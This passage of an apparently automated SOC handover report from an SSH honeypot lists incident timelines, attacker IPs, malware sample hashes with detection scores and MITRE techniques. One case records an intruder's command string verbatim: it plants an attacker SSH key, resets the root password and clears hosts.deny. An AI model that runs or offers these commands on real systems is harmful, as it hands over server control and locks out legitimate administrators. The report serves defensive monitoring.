| `2026-04-13 20:07:46` | `cowrie.session.file_download` |
| `2026-04-13 20:07:46` | `cowrie.log.closed` |
| `2026-04-13 20:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b105d0d70112

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:07 |
| **Last Seen** | 2026-04-13 20:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:07:49` | `cowrie.session.connect` |
| `2026-04-13 20:07:49` | `cowrie.client.version` |
| `2026-04-13 20:07:50` | `cowrie.client.kex` |
| `2026-04-13 20:07:51` | `cowrie.login.success` |
| `2026-04-13 20:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4453202fd798

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-04-13 20:27 |
| **Last Seen** | 2026-04-13 20:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:384bmsDpSkBU"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:27:39` | `cowrie.session.connect` |
| `2026-04-13 20:27:39` | `cowrie.client.version` |
| `2026-04-13 20:27:39` | `cowrie.client.kex` |
| `2026-04-13 20:27:39` | `cowrie.login.success` |
| `2026-04-13 20:27:40` | `cowrie.session.params` |
| `2026-04-13 20:27:40` | `cowrie.command.input` |
| `2026-04-13 20:27:40` | `cowrie.command.failed` |
| `2026-04-13 20:27:40` | `cowrie.log.closed` |
| `2026-04-13 20:27:40` | `cowrie.session.params` |
| `2026-04-13 20:27:40` | `cowrie.command.input` |
| `2026-04-13 20:27:40` | `cowrie.session.file_download` |
| `2026-04-13 20:27:40` | `cowrie.log.closed` |
| `2026-04-13 20:27:52` | `cowrie.session.params` |
| `2026-04-13 20:27:52` | `cowrie.command.input` |
| `2026-04-13 20:27:53` | `cowrie.log.closed` |
| `2026-04-13 20:27:53` | `cowrie.session.params` |
| `2026-04-13 20:27:53` | `cowrie.command.input` |
| `2026-04-13 20:27:53` | `cowrie.log.closed` |
| `2026-04-13 20:27:53` | `cowrie.session.params` |
| `2026-04-13 20:27:53` | `cowrie.command.input` |
| `2026-04-13 20:27:54` | `cowrie.session.file_download` |
| `2026-04-13 20:27:54` | `cowrie.log.closed` |
| `2026-04-13 20:27:54` | `cowrie.session.params` |
| `2026-04-13 20:27:54` | `cowrie.command.input` |
| `2026-04-13 20:27:54` | `cowrie.log.closed` |
| `2026-04-13 20:27:54` | `cowrie.session.params` |
| `2026-04-13 20:27:54` | `cowrie.command.input` |
| `2026-04-13 20:27:55` | `cowrie.log.closed` |
| `2026-04-13 20:27:55` | `cowrie.session.params` |
| `2026-04-13 20:27:55` | `cowrie.command.input` |
| `2026-04-13 20:27:55` | `cowrie.command.input` |
| `2026-04-13 20:27:55` | `cowrie.log.closed` |
| `2026-04-13 20:27:55` | `cowrie.session.params` |
| `2026-04-13 20:27:55` | `cowrie.command.input` |
| `2026-04-13 20:27:56` | `cowrie.log.closed` |
| `2026-04-13 20:27:56` | `cowrie.session.params` |
| `2026-04-13 20:27:56` | `cowrie.command.input` |
| `2026-04-13 20:27:56` | `cowrie.log.closed` |
| `2026-04-13 20:27:56` | `cowrie.session.params` |
| `2026-04-13 20:27:56` | `cowrie.command.input` |
| `2026-04-13 20:27:56` | `cowrie.log.closed` |
| `2026-04-13 20:27:57` | `cowrie.session.params` |
| `2026-04-13 20:27:57` | `cowrie.command.input` |
| `2026-04-13 20:27:57` | `cowrie.log.closed` |
| `2026-04-13 20:27:57` | `cowrie.session.params` |
| `2026-04-13 20:27:57` | `cowrie.command.input` |
| `2026-04-13 20:27:57` | `cowrie.log.closed` |
| `2026-04-13 20:27:58` | `cowrie.session.params` |
| `2026-04-13 20:27:58` | `cowrie.command.input` |
| `2026-04-13 20:27:58` | `cowrie.log.closed` |
| `2026-04-13 20:27:58` | `cowrie.session.params` |
| `2026-04-13 20:27:58` | `cowrie.command.input` |
| `2026-04-13 20:27:58` | `cowrie.log.closed` |
| `2026-04-13 20:27:59` | `cowrie.session.params` |
| `2026-04-13 20:27:59` | `cowrie.command.input` |
| `2026-04-13 20:27:59` | `cowrie.log.closed` |
| `2026-04-13 20:27:59` | `cowrie.session.params` |
| `2026-04-13 20:27:59` | `cowrie.command.input` |
| `2026-04-13 20:27:59` | `cowrie.log.closed` |
| `2026-04-13 20:28:00` | `cowrie.session.params` |
| `2026-04-13 20:28:00` | `cowrie.command.input` |
| `2026-04-13 20:28:00` | `cowrie.log.closed` |
| `2026-04-13 20:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `201.77.124[.]248` | **25** | 2026-04-13 19:34 | 2026-04-13 20:18 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.139.193[.]223` | **22** | 2026-04-13 19:14 | 2026-04-13 20:05 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.186.7[.]9` | **22** | 2026-04-13 19:30 | 2026-04-13 20:30 | 35m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.128.240[.]75` | **13** | 2026-04-13 19:45 | 2026-04-13 20:08 | 14m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `66.132.186[.]166` | **2** | 2026-04-13 20:43 | 2026-04-13 20:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.42.140[.]200` | 1 | 2026-04-13 19:14 | 2026-04-13 19:15 | 16s | 0 | `T1592` | 🟢 LOW |
| `106.225.215[.]154` | 1 | 2026-04-13 19:35 | 2026-04-13 19:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.105[.]246` | 1 | 2026-04-13 19:37 | 2026-04-13 19:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.99.92[.]11` | 1 | 2026-04-13 19:32 | 2026-04-13 19:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `197.225.146[.]23` | 1 | 2026-04-13 19:31 | 2026-04-13 19:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.247.143[.]193` | 1 | 2026-04-13 19:46 | 2026-04-13 19:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-04-13 19:30 | 2026-04-13 19:31 | 26s | 0 | `T1592` | 🟢 LOW |
| `60.167.166[.]161` | 1 | 2026-04-13 19:30 | 2026-04-13 19:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.30.162[.]19` | 1 | 2026-04-13 19:32 | 2026-04-13 19:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.225.215[.]154` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 6 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `66.132.186[.]166` | US | Censys, Inc. | **100** ⚠️ | 27 |
| `103.139.193[.]223` | ID | PT. Halto Petirah Angrowangi | **100** ⚠️ | 38 |
| `197.225.146[.]23` | MU | MauritiusTelecom | **100** ⚠️ | 50 |
| `27.128.240[.]75` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `60.167.166[.]161` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `201.77.124[.]248` | BR | Desktop Sigmanet Comunicação Multimídia SA | **100** ⚠️ | 50 |
| `118.186.7[.]9` | CN | Beijing xhxt technology development co., LTD | **100** ⚠️ | 7 |
| `81.30.162[.]19` | UA | This is a Vinteleport company Core network, used for | **100** ⚠️ | 40 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 148 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
| Tool 34  | Credential Extractor        | ✅ 117 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 84 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T20:53:20Z_
